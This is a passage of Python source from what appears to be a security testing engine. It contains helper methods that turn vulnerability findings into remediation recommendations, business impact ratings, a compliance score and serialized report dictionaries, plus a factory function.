        elif finding.severity == SecuritySeverity.MEDIUM:
            return "Moderate security risk requiring attention"
        else:
            return "Low risk but contributes to overall security posture"
    
    def _get_key_recommendations(self, findings: List[SecurityFinding]) -> List[str]:
        """Get key security recommendations."""
        recommendations = []
        
        vulnerability_types = set(f.vulnerability_type for f in findings)
        
        if "sql_injection" in vulnerability_types:
            recommendations.append("Implement parameterized queries across all database interactions")
        
        if "xss" in vulnerability_types:
            recommendations.append("Deploy Content Security Policy and implement output encoding")
        
        if "hardcoded_secrets" in vulnerability_types:
            recommendations.append("Implement secure secrets management system")
        
        if "authentication_bypass" in vulnerability_types:
            recommendations.append("Review and strengthen authentication mechanisms")
        
        if "weak_crypto" in vulnerability_types:
            recommendations.append("Update cryptographic implementations to use strong algorithms")
        
        return recommendations
    
    def _assess_business_impact(self, findings: List[SecurityFinding]) -> str:
        """Assess business impact of security findings."""
        critical_count = sum(1 for f in findings if f.severity == SecuritySeverity.CRITICAL)
        high_count = sum(1 for f in findings if f.severity == SecuritySeverity.HIGH)
        
        if critical_count > 0:
            return "High - Critical vulnerabilities pose immediate risk to business operations"
        elif high_count > 3:
            return "Medium-High - Multiple high-severity vulnerabilities require urgent attention"
        elif high_count > 0:
            return "Medium - High-severity vulnerabilities present significant risk"
        else:
            return "Low - Security posture is acceptable with minor improvements needed"
    
    def _calculate_compliance_score(self, findings: List[SecurityFinding]) -> float:
        """Calculate compliance score based on findings."""
        total_compliance_weight = 100.0
        deductions = 0.0
        
        for finding in findings:
            if finding.severity == SecuritySeverity.CRITICAL:
                deductions += 20.0
            elif finding.severity == SecuritySeverity.HIGH:
                deductions += 10.0
            elif finding.severity == SecuritySeverity.MEDIUM:
                deductions += 5.0
            else:
                deductions += 1.0
        
        compliance_score = max(0.0, total_compliance_weight - deductions)
        return min(compliance_score, 100.0)
    
    def _serialize_finding(self, finding: SecurityFinding) -> Dict[str, Any]:
        """Serialize security finding to dictionary."""
        return {
            "finding_id": finding.finding_id,
            "detection_time": finding.detection_time.isoformat(),
            "title": finding.title,
            "description": finding.description,
            "severity": finding.severity.value,
            "cvss_score": finding.cvss_score,
            "cvss_vector": finding.cvss_vector,
            "file_path": finding.file_path,
            "line_number": finding.line_number,
            "function_name": finding.function_name,
            "component": finding.component,
            "vulnerability_type": finding.vulnerability_type,
            "cwe_id": finding.cwe_id,
            "cve_id": finding.cve_id,
            "owasp_category": finding.owasp_category,
            "evidence": finding.evidence,
            "reproduction_steps": finding.reproduction_steps,
            "proof_of_concept": finding.proof_of_concept,
            "remediation_guidance": finding.remediation_guidance,
            "fix_complexity": finding.fix_complexity,
            "fix_priority": finding.fix_priority,
            "test_type": finding.test_type.value,
            "test_tool": finding.test_tool,
            "scan_target": finding.scan_target,
            "classification_level": finding.classification_level,
            "requires_immediate_action": finding.requires_immediate_action,
            "false_positive_likelihood": finding.false_positive_likelihood,
            "compliance_violations": finding.compliance_violations,
            "regulatory_impact": finding.regulatory_impact,
            "status": finding.status,
            "assigned_to": finding.assigned_to,
            "due_date": finding.due_date.isoformat() if finding.due_date else None,
            "resolution_notes": finding.resolution_notes
        }


# Factory function for creating security test engine
def create_security_test_engine(
    audit_validator: AuditSystemValidator,
    audit_logger: AuditLogger,
    monitoring_system: EnhancedMonitoringSystem,
    real_time_alerting: RealTimeAlerting
) -> SecurityTestEngine:
    """Create and initialize security test engine."""
    return SecurityTestEngine(
        audit_validator=audit_validator,
        audit_logger=audit_logger,
        monitoring_system=monitoring_system,
        real_time_alerting=real_time_alerting
    )


if __name__ == "__main__":
    # Example usage
    print("Security Testing Engine - see code for usage examples")